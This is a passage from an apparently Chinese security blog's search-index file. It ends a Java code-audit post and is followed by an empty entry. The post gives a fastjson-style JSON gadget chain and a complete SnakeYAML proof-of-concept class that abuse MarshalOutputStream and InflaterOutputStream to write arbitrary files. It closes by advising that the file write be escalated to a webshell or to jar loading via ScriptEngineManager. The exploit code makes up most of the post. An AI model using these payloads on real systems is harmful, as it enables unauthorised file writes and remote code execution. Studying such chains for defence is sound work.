class="hljs-string">&quot;x&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,<br>        <span class="hljs-string">&quot;out&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,<br>            <span class="hljs-string">&quot;out&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>,<br>                <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/dest.txt&quot;</span>,<br>                <span class="hljs-string">&quot;append&quot;</span>:false<br>            &#125;,<br>            <span class="hljs-string">&quot;infl&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;input&quot;</span>:<span class="hljs-string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;bufLen&quot;</span>:<span class="hljs-number">1048576</span><br>        &#125;,<br>        <span class="hljs-string">&quot;protocolVersion&quot;</span>:<span class="hljs-number">1</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个snakeyaml可以用，写了个poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalData</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;whoamipriv&quot;</span>;<br>        <span class="hljs-type">byte</span>[] compressedData = compressData(originalData.getBytes());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(compressedData));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\&quot;c:/users/daniel/desktop/1.txt\&quot;],false],!!java.util.zip.Inflater  &#123; input: !!binary &quot;</span> +  base64 +<span class="hljs-string">&quot; &#125;,1048576]]&quot;</span>;<br><br>        yaml.load(poc);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] compressData(<span class="hljs-type">byte</span>[] data) &#123;<br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>();<br>        deflater.setInput(data);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>(data.length);<br><br>        deflater.finish();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (!deflater.finished()) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> deflater.deflate(buffer);<br>            outputStream.write(buffer, <span class="hljs-number">0</span>, count);<br>        &#125;<br><br>        deflater.end();<br>        <span class="hljs-keyword">return</span> outputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>hh写完才发现作者最下面给了poc了。</p><p>写完文件后，可以写webshell，写不了可以写个jar包用ScriptEngineManager加载jar。</p><p>完。</p>]]></content>
    
    
    
    <tags>
      
      <tag>java codeaudit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/12/hibernate/"/>
    <url>/2024/01/12/hibernate/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
